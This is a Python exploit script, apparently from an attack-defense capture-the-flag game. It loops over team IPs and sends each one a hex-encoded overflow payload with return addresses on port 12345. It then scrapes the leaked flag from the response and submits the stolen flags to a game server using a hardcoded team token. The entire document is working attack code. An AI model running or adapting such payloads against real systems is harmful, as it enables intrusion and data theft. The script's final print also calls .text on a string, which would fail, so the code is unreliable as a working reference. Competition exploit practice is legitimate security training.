import binascii
import pwn
import requests
import time

pwn.context.log_level = 'error'

TEAM_TOKEN = '21d7214f2de4f6e743364e49196a346d'

def loop():
    flags=[]
    tutto=requests.get("http://10.10.0.1:8081/flagIds").json()["waqs"]
    for ip, ids in tutto.items():
        for _id in ids:

            try:
                conn=pwn.remote(ip, 12345, timeout=0.2)
                payload=binascii.unhexlify("41414141414141410000000041414141414141414141414141411a10400000000000832e400000000000")+ \
                                       pwn.p32(int(_id))+ \
                                binascii.unhexlify("00000000b0244000000000000a")
                conn.sendline(payload)
                for _ in range(9):
                   conn.recvline()
                flag=conn.recvline()[17:-1].decode()
                print(flag)
                flags.append(flag)
                conn.close()
            except:
                print("cilecca")
                pass
    r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN},json=flags).text
    print(r.text)
    time.sleep(60)
loop()